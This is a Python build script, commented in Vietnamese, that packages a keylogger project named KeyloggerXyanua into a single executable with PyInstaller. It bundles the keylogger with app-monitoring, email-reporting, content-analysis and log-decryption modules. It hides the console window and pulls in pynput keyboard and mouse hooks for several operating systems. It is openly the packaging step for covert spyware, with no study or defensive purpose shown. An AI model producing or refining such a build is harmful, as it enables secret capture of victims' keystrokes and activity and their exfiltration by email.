import PyInstaller.__main__
import os
import sys

def build_exe():
    # Xác định đường dẫn hiện tại
    current_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Các file cần đóng gói
    files_to_include = [
        'keylogger.py',
        'app_monitor.py',
        'email_reporter.py',
        'decrypt_log.py',
        'decrypt_app_log.py',
        'content_analyzer.py'
    ]
    
    # Tạo thư mục logs nếu chưa tồn tại
    logs_dir = os.path.join(current_dir, 'logs')
    if not os.path.exists(logs_dir):
        os.makedirs(logs_dir)
    
    # Cấu hình PyInstaller
    PyInstaller.__main__.run([
        'keylogger.py',  # File chính
        '--name=KeyloggerXyanua',  # Tên file output
        '--onefile',  # Đóng gói thành 1 file
        '--noconsole',  # Ẩn console window
        '--icon=icon.ico',  # Icon cho file exe
        '--add-data=README.md;.',  # Thêm README
        '--add-data=requirements.txt;.',  # Thêm requirements
        '--hidden-import=pynput.keyboard._win32',  # Thêm các module ẩn
        '--hidden-import=pynput.mouse._win32',
        '--hidden-import=pynput.keyboard._darwin',
        '--hidden-import=pynput.mouse._darwin',
        '--hidden-import=pynput.keyboard._xorg',
        '--hidden-import=pynput.mouse._xorg',
        '--clean',  # Xóa cache trước khi build
        '--noconfirm',  # Không hỏi xác nhận
    ])

if __name__ == '__main__':
    build_exe() 